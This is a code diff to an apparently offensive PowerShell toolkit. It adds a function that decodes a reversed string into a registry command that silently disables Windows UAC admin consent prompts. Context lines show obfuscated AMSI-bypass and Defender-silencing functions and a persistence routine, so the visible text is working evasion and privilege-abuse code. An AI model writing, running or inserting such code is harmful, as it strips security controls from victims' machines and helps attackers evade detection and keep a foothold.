@@ -482,6 +482,14 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('ble:1'+'q2')  + ('uZ'+'x') ) ( [TYpE]( "{1}{0}
 Export-ModuleMember -Function bpsamsi
 Set-Alias -Name bpsamsi -Value bpsamsi
 
+# admin request !!
+function process-disableUAC {
+	$ax3 = 'f/ 0 d/ DROWD_GER t/ nimdAroivaheBtpmorPtnesnoC v/ "metsyS\seiciloP\noisreVtnerruC\swodniW\tfosorciM\ERAWTFOS\MLKH" DDA exe.ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+	start-process cmd "/c $sp1k3 " -WindowStyle hidden
+}
+Export-ModuleMember -Function process-disableUAC 
+Set-Alias -Name process-disableUAC  -Value process-disableUAC 
+
 #must be admin !!
 function silentdefender {
 	$Bpm4mSI=[Ref].Assembly.GetType('S'+'ys'+''+''+''+''+'t'+'em.M'+'a'+'na'+'g'+'e'+'m'+''+''+''+''+''+''+'e'+'n'+''+''+''+''+''+'t.Au'+'to'+'mat'+'ion.A'+''+''+''+''+'m'+'s'+'i'+'U'+'t'+'i'+'ls')
@@ -523,5 +531,6 @@ cd $env:??e????f???
 }
 Export-ModuleMember -Function persistence-neighbor
 Set-Alias -Name persistence-neighbor -Value persistence-neighbor
+
 
 
